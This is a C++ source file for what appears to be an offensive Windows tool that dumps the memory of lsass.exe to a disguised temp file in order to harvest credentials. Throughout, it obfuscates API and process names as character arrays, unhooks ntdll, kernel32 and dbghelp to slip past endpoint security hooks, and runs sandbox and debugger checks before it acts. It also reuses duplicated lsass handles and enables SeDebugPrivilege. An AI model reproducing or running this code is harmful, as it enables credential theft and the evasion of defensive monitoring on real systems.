// credits : sektor7 unhooking with fresh DbgHelp.dll copy (implementation) 
//         && 
//           NtRaiseHardError (author of this technique)
//			: https://github.com/kartikdurg/
//			lsass handle duplication


#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#include <wchar.h>
#include <iostream>
#include <TlHelp32.h>
#include <winternl.h>

using namespace std;

#pragma comment (lib, "Dbghelp")
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef HANDLE(NTAPI* _NtOpenProcess)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef BOOL(NTAPI* _NtQueryFullProcessImageNameW)(
	HANDLE hProcess,
	DWORD  dwFlags,
	LPWSTR lpExeName,
	PDWORD lpdwSize
	);
/*
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
*/
typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}


typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
VirtualProtect_t VirtualProtect_p = NULL;


unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };
unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
unsigned char sAdvapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };

unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0 };
unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };


int Error(const char* msg) {
	printf("%s (%u)\n", GetLastError());
	return -1;
}

void m1n1dumpIt(HANDLE hProc) {

	char filepath[MAX_PATH];
	memset(filepath, 0, MAX_PATH);
	char* Buffer;
	size_t BufferCount;
	char tmp[] = { 'T','e','m','p',0 };
	_dupenv_s(&Buffer, &BufferCount, tmp);
	//printf("Buffer[TEMP] = %s\n", Buffer);
	char l$$[] = { '\\','c','4','d','d','2','a','4','6','-','c','e','e','b','-','4','2','5','d','-','8','d','c','b','-','a','e','2','1','b','3','4','1','c','a','4','5','.','t','m','p',0 };
	sprintf(filepath, "%s%s", Buffer, l$$);
	//printf("filepath : %s\n", filepath);
	wchar_t wfilepath[MAX_PATH];
	mbstowcs(wfilepath, filepath, MAX_PATH);
	//printf("wfilepath : %ws\n", wfilepath);

	HANDLE hFile = CreateFile(wfilepath, GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!hFile) {
		printf("Failed in m1n1dumpIT:CreateFile (%u)\n", GetLastError());
	}
	else
	{

		DWORD l$a$$Pid = GetProcessId(hProc);
		BOOL dumpStat = MiniDumpWriteDump(hProc, l$a$$Pid, hFile, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
		EncryptFileA(filepath);
		
		CloseHandle(hFile);

		if (!dumpStat) {
			printf("Failed in m1n1dumpIt:M1n1DumpWr1teDump (%u)\n", GetLastError());
		}
		else {
			printf("1$a$$ Dl_lmp in %s\n", filepath);
		}
	}

}


static int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
	/*
		UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
	int i;


	// find .text section
	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pish->Name, ".text")) {
			// prepare hDbghelp.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}
			// copy original .text section into hDbghelp memory
			memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

			// restore original protection settings of hDbghelp
			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			// all is good, time to go home
			return 0;
		}
	}
	// .text section not found?
	return -1;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		//char StrGetTknInfo[] = {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n',0};
		//GetTokenInformation_t pGetTokenInformation = (GetTokenInformation_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), StrGetTknInfo);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };


	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	wchar_t lpwPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("I dont have SeDebugPirvs\n");
		return FALSE;
	}



	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("Could not adjust to SeDebugPrivs\n");

		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

	unsigned int sDbghelpPath_len = sizeof(sDbghelpPath);
	unsigned int sDbghelp_len = sizeof(sDbghelp);
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;

	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

	// open the DLL
	hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open the DLL
		printf("failed to open ntdll.dll %u", GetLastError());
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		// file mapping failed

		CloseHandle(hFile);
		printf("file mapping failed %u", GetLastError());
	}

	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
		// mapping failed
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		printf("mapping failed %u", GetLastError());
	}

	// remove hooks
	ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);
}


// https://github.com/kartikdurg/Enum-LSASS/blob/main/Example/enum_lsass_handles.c
HANDLE enum_lsass_handles() {
	
	char qsysinfo[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
	char dupo[] = { 'N','t','D','u','p','l','i','c','a','t','e','O','b','j','e','c','t',0 };
	char qo[] = { 'N','t','Q','u','e','r','y','O','b','j','e','c','t',0 };
	char qfpi[] = { 'Q','u','e','r','y','F','u','l','l','P','r','o','c','e','s','s','I','m','a','g','e','N','a','m','e','W',0 };
	char op[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };

	_NtQuerySystemInformation ffNtQuery_SystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)sNtdll, qsysinfo);
	_NtDuplicateObject ffNtDuplicate_Object = (_NtDuplicateObject)GetLibraryProcAddress((PSTR)sNtdll, dupo);
	_NtQueryObject ffNtQuery_Object = (_NtQueryObject)GetLibraryProcAddress((PSTR)sNtdll, qo);
	_NtQueryFullProcessImageNameW ffNtQuery_FullProcessImageNameW = (_NtQueryFullProcessImageNameW)GetLibraryProcAddress((PSTR)sKernel32, qfpi);
	_NtOpenProcess ffNtOpen_Process = (_NtOpenProcess)GetLibraryProcAddress((PSTR)sKernel32, op);

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	ULONG pid;
	HANDLE processHandle;
	ULONG i;
	HANDLE lsass_handles = NULL;

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);

	// NtQuerySystemInformation won't give us the correct buffer size,
	//  so we guess by doubling the buffer size.
	while ((status = ffNtQuery_SystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

	// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
	if (!NT_SUCCESS(status)) {
		printf("NtQuerySystemInformation failed!\n");
		return (HANDLE)1;
	}

	for (i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo;
		PVOID objectNameInfo;
		UNICODE_STRING objectName;
		ULONG returnLength;

		// Check if PID belongs to System
		if (handle.ProcessId == 4)
			continue;

		processHandle = ffNtOpen_Process(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId);

		// Duplicate the handle so we can query it.
		if (!NT_SUCCESS(ffNtDuplicate_Object(
			processHandle,
			(void*)handle.Handle,
			GetCurrentProcess(),
			&dupHandle,
			PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
			0,
			0
		))) {
			continue;
		}


		// Query the object type.
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(ffNtQuery_Object(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		))) {
			continue;
		}

		UNICODE_STRING objectType = *(PUNICODE_STRING)objectTypeInfo;

		wchar_t path[MAX_PATH];
		DWORD maxPath = MAX_PATH;

		if (wcsstr(objectType.Buffer, L"Process") != NULL)
		{
			// Print handle, type and its PID

			ffNtQuery_FullProcessImageNameW(dupHandle, 0, path, &maxPath);
			if (wcsstr(path, L"lsass.exe") != NULL) {
				printf("[%#x] %S: %d %ws\n", handle.Handle, objectType.Buffer, handle.ProcessId, path);
				lsass_handles = dupHandle;
			}
		}
		free(objectTypeInfo);
	}
	free(handleInfo);

	return lsass_handles;
}

int main(int argc, char** argv) {
	
	// what is my name???
	if (strstr(argv[0], "MiniDump.exe") == NULL) {
		printf("Don't change the name :(\n");
		return -2;
	}

	// escaping s1ndb0x
	// CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD nmbOfCores = systemInfo.dwNumberOfProcessors;
	if (nmbOfCores < 2) {
		return -1;
	}

	// RAM
	MEMORYSTATUSEX memorystatus;
	memorystatus.dwLength = sizeof(memorystatus);
	GlobalMemoryStatusEx(&memorystatus);
	DWORD RAMMB = memorystatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 4096) {
		return -1;
	}

	// HDD
	wchar_t phyDri[] = { '\\','\\','.','\\','P','h','y','s','i','c','a','l','D','r','i','v','e','0',0 };
	HANDLE hDevice = CreateFileW(phyDri, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) {
		return -1;
	}
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hSnapshot)
		return Error("Failed in CreateToolhelp32Snapshot\n");

	PROCESSENTRY32 PE32;
	PE32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &PE32))
		return Error("Failed in Process32First\n");

	while (Process32Next(hSnapshot, &PE32)) {
		size_t i;
		char* pMBBuffer = (char*)malloc(MAX_PATH);
		const wchar_t* pWCBuffer = PE32.szExeFile;

		wcstombs_s(&i, pMBBuffer, (size_t)MAX_PATH, pWCBuffer, (size_t)MAX_PATH - 1);
		const char vmt00l[] = { 'v','m','t','o','o','l','s','d','.','e','x','e',0 };
		const char vm3d[] = { 'v','m','3','d','s','e','r','v','i','c','e','.','e','x','e',0};
		const char vGAu[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e','.','e','x','e',0 };
		const char vbser[] = { 'v','b','o','x','s','e','r','v','i','c','e','.','e','x','e',0 };
		const char vbtra[] = { 'v','b','o','x','t','r','a','y','.','e','x','e',0 };

		/*
		if (!strcmp(vmt00l, pMBBuffer)) {
			return -1;
		}
		if (!strcmp(vm3d, pMBBuffer)) {
			return -1;
		}
		if (!strcmp(vGAu, pMBBuffer)) {
			return -1;
		}
		
		if (!strcmp(vbser, pMBBuffer)) {
			return -1;
		}
		if (!strcmp(vbtra, pMBBuffer)) {
			return -1;
		}
		
		if (pMBBuffer)
		{
			free(pMBBuffer);
		}
		*/
	}


	HANDLE h = GetCurrentProcess();
	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG lenght = 0;
	HINSTANCE ntdll;
	MYPROC GetProcessInformation;
	wchar_t ntd[] = { 'n','t','d','l','l','.','d','l','l',0 };
	ntdll = LoadLibrary(ntd);

	//resolve address of NtQueryInformationProcess in ntdll.dll
	GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");

	//get _PEB object
	(GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);

	//replace commandline and imagepathname
	BYTE BeingDebugged = ProcessInformation.PebBaseAddress->BeingDebugged;
	if (BeingDebugged) {
		return -1;
	}


	char* mem = NULL;
	mem = (char*)malloc(10000000000);

	if (mem != NULL) {
		memset(mem, 00, 10000000000);
		free(mem);

		FreshCopy(sNtdllPath, sNtdll);
		FreshCopy(sKernel32Path, sKernel32);
		FreshCopy(sDbghelpPath, sDbghelp);
		DWORD l$a$$Pid = 0;
		// Find lsass PID	
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 processEntry = {};
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		LPCWSTR processName = L"";
		//wchar_t l$a$$[] = {'l','s','a','s','s','.','e','x','e',0};
		char l$a$$[MAX_PATH];
		memset(l$a$$, 0, MAX_PATH);
		char ls[] = "ls";
		char as[] = "as";
		char s_[] = "s.e";
		char ex[] = "xe";

		strcat(l$a$$, ls);
		strcat(l$a$$, as);
		strcat(l$a$$, s_);
		strcat(l$a$$, ex);

		if (!IsElevated()) {
			printf("not admin\n");
			return -1;
		}
		if (!SetDebugPrivilege()) {
			printf("no SeDebugPrivs\n");
			return -1;
		}
	
		HANDLE hProcess = enum_lsass_handles();
		
		if (!hProcess)
			printf("Failed in OpenProcess (%u)\n");
		m1n1dumpIt(hProcess);
		CloseHandle(hProcess);
		return 0;
	}
}

